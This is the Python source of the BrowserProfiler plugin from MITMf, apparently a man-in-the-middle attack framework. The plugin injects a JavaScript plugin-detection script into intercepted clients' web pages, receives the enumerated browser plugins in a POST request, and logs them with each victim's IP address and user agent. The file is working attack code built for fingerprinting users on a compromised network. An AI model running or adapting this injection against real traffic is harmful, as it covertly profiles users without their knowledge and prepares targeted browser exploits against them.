#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import logging

from pprint import pformat
from plugins.plugin import Plugin
from plugins.Inject import Inject

mitmf_logger = logging.getLogger("mitmf")

class BrowserProfiler(Inject, Plugin):
    name       = "BrowserProfiler"
    optname    = "browserprofiler"
    desc       = "Attempts to enumerate all browser plugins of connected clients"
    version    = "0.3"
    has_opts   = False

    def initialize(self, options):
        self.output = {}  # so other plugins can access the results

        Inject.initialize(self, options)
        self.html_payload = self.get_payload()
        
    def post2dict(self, post):  #converts the ajax post to a dic
        d = dict()
        for line in post.split('&'):
            t = line.split('=')
            d[t[0]] = t[1]
        return d

    def clientRequest(self, request):
        #Handle the plugin output
        if 'clientprfl' in request.uri:
            request.printPostData = False 

            self.output = self.post2dict(request.postData)
            self.output['ip'] = request.client.getClientIP()
            self.output['useragent'] = request.clientInfo

            if self.output['plugin_list']:
                self.output['plugin_list'] = self.output['plugin_list'].split(',')
            
            pretty_output = pformat(self.output)
            mitmf_logger.info("{} [BrowserProfiler] Got data:\n{}".format(request.client.getClientIP(), pretty_output))

    def get_payload(self):
        plugindetect = open("./core/javascript/plugindetect.js", 'r').read()
        return '<script type="text/javascript">' + plugindetect + '</script>'
